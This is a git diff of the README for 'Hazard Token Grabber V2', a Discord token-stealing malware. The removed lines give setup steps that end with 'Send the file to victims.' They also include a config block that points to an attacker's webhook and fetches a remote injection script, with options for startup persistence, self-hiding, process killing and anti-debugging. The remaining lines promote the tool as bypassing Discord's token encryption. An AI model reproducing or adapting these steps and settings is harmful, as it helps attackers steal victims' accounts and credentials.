@@ -64,49 +64,6 @@ Hazard was made for educational purposes, therefor all consequences cased by you
 
 ---
 
-## <a id="setup"></a> 📁 〢 Setting up Hazard Token Grabber.V2
-
-1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
-2. Open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) with notepad or some other editor
-3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
-4. Double Click `setup.bat` and allow it to finish.
-5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
-6. Send the file to victims. 😈
-
-## <a id="config"></a>⚙ 〢 Config
-
-If you Want to change the config, open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) and locate it at the top. There you can configure the following:
-
-```py
-config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
-    'webhook_protector_key': "KEY_HERE",
-    # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-    # if True, it will ping @everyone when someone ran Hazard v2
-    'ping_on_run': False,
-    # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
-    # if you want the file to run at startup
-    'startup': True,
-    # if you want the file to hide itself after run
-    'hide_self': True,
-    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': True,
-    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
-    'blackListedPrograms':
-    [
-      ...
-    ]
-
-}
-```
-
----
-
 ## <a id="why_hazard"></a>🔎 〢 Why choose Hazard v2?
 
 You might be wondering, Why choose this grabber instead of other ones like [Mercurial](https://github.com/NightfallGT/Mercurial-Grabber) or [ItroublveTSC](https://github.com/Itroublve/ItroublveTSC). Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a [injection](https://github.com/Rdimo/Discord-Injection) which also currently is the only working one.
